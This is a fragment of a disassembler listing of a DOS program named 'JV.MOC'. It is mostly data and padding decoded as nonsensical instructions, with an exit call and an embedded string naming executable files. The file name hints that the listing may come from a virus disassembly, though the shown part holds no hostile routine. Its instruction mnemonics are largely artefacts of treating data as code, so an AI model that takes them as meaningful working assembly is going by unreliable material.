0000:0644  1800                      SBB     [BX+SI],AL
0000:0646  F1                        DB      0F1H
0000:0647  1F                        POP     DS
0000:0648  FFFF                      ???     DI
0000:064A  FFFF                      ???     DI
0000:064C  0000                      ADD     [BX+SI],AL
0000:064E  0000                      ADD     [BX+SI],AL
0000:0650  0000                      ADD     [BX+SI],AL
0000:0652  0000                      ADD     [BX+SI],AL
0000:0654  0000                      ADD     [BX+SI],AL
0000:0656  0000                      ADD     [BX+SI],AL
0000:0658  0000                      ADD     [BX+SI],AL
0000:065A  0000                      ADD     [BX+SI],AL
0000:065C  0000                      ADD     [BX+SI],AL
0000:065E  0000                      ADD     [BX+SI],AL
0000:0660  CD21                      INT     021H
0000:0662  CB                        RET                       ; INTERSEGMENT
0000:0663  0000              X0663:  ADD     [BX+SI],AL
0000:0665  0000                      ADD     [BX+SI],AL
0000:0667  0000                      ADD     [BX+SI],AL
0000:0669  0000                      ADD     [BX+SI],AL
0000:066B  0000                      ADD     [BX+SI],AL
0000:066D  2020                      AND     [BX+SI],AH
0000:066F  2020                      AND     [BX+SI],AH
0000:0671  2020                      AND     [BX+SI],AH
0000:0673  2020                      AND     [BX+SI],AH
0000:0675  2020                      AND     [BX+SI],AH
0000:0677  2000                      AND     [BX+SI],AL
0000:0679  0000                      ADD     [BX+SI],AL
0000:067B  0000                      ADD     [BX+SI],AL
0000:067D  2020                      AND     [BX+SI],AH

"JV.MOC"                                                              PAGE  0013

0000:067F  2020                      AND     [BX+SI],AH
0000:0681  2020                      AND     [BX+SI],AH
0000:0683  2020                      AND     [BX+SI],AH
0000:0685  2020                      AND     [BX+SI],AH
0000:0687  2000                      AND     [BX+SI],AL
0000:0689  0000                      ADD     [BX+SI],AL
0000:068B  0000                      ADD     [BX+SI],AL
0000:068D  0000                      ADD     [BX+SI],AL
0000:068F  0000                      ADD     [BX+SI],AL
0000:0691  0D6B6F                    OR      AX,06F6BH
0000:0694  6465                      JZ      X06FB
0000:0696  6572                      JNZ     X070A
0000:0698  7A2E                      JPE     X06C8
0000:069A  6578                      JNZ     X0714
0000:069C  6520                      JNZ     X06BE
0000:069E  613A                      JNO     X06DA
0000:06A0  6B6F                      JPO     X0711
0000:06A2  6465                      JZ      X0709
0000:06A4  6572                      JNZ     X0718
0000:06A6  2E6578                    JNZ     X0721
0000:06A9  650D                      JNZ     X06B8
0000:06AB  0000                      ADD     [BX+SI],AL
0000:06AD  0000                      ADD     [BX+SI],AL
0000:06AF  0000                      ADD     [BX+SI],AL
0000:06B1  0000                      ADD     [BX+SI],AL
0000:06B3  0000                      ADD     [BX+SI],AL
0000:06B5  0000                      ADD     [BX+SI],AL
0000:06B7  0000                      ADD     [BX+SI],AL
0000:06B9  0000                      ADD     [BX+SI],AL
0000:06BB  0000                      ADD     [BX+SI],AL
0000:06BD  0000                      ADD     [BX+SI],AL
0000:06BF  0000                      ADD     [BX+SI],AL
0000:06C1  0000                      ADD     [BX+SI],AL
0000:06C3  0000                      ADD     [BX+SI],AL
0000:06C5  0000                      ADD     [BX+SI],AL
0000:06C7  0000                      ADD     [BX+SI],AL
0000:06C9  0000                      ADD     [BX+SI],AL
0000:06CB  0000                      ADD     [BX+SI],AL
0000:06CD  0000                      ADD     [BX+SI],AL
0000:06CF  0000                      ADD     [BX+SI],AL
0000:06D1  0000                      ADD     [BX+SI],AL
0000:06D3  0000                      ADD     [BX+SI],AL
0000:06D5  0000                      ADD     [BX+SI],AL
0000:06D7  0000                      ADD     [BX+SI],AL
0000:06D9  005718                    ADD     [BX+018H],DL
0000:06DC  0825                      OR      [DI],AH
0000:06DE  A5                        MOVSW   
0000:06DF  FEC5                      INC     CH
0000:06E1  07                        POP     ES
0000:06E2  1E                        PUSH    DS
0000:06E3  0210                      ADD     DL,[BX+SI]
0000:06E5  07                        POP     ES
0000:06E6  57                        PUSH    DI
0000:06E7  18B10D47                  SBB     [BX+DI+Y0470DH],DH
0000:06EB  0104                      ADD     [SI],AX
0000:06ED  7F70                      JG      X075F

"JV.MOC"                                                              PAGE  0014

0000:06EF  0010                      ADD     [BX+SI],DL
0000:06F1  07                        POP     ES
0000:06F2  1D001C                    SBB     AX,01C00H
0000:06F5  09A20D3D                  OR      [BP+SI+Y03D0DH],SP
0000:06F9  0C1B                      OR      AL,01BH
0000:06FB  02B10D02          X06FB:  ADD     DH,[BX+DI+Y020DH]
0000:06FF  F24D                      REPNE  DEC     BP
0000:0701  360E                      PUSH    CS
0000:0703  0300                      ADD     AX,[BX+SI]
0000:0705  0000                      ADD     [BX+SI],AL
0000:0707  00EE                      ADD     DH,CH
0000:0709  002A              X0709:  ADD     [BP+SI],CH
0000:070B  0F                        POP     CS
0000:070C  42                        INC     DX
0000:070D  01C1                      ADD     CX,AX
0000:070F  0DB44C                    OR      AX,04CB4H
0000:0712  B000                      MOV     AL,00H
0000:0714  CD21              X0714:  INT     021H
0000:0716  4D                        DEC     BP
0000:0717  7344                      JAE     X075D
0000:0719  6F73                      JG      X078E

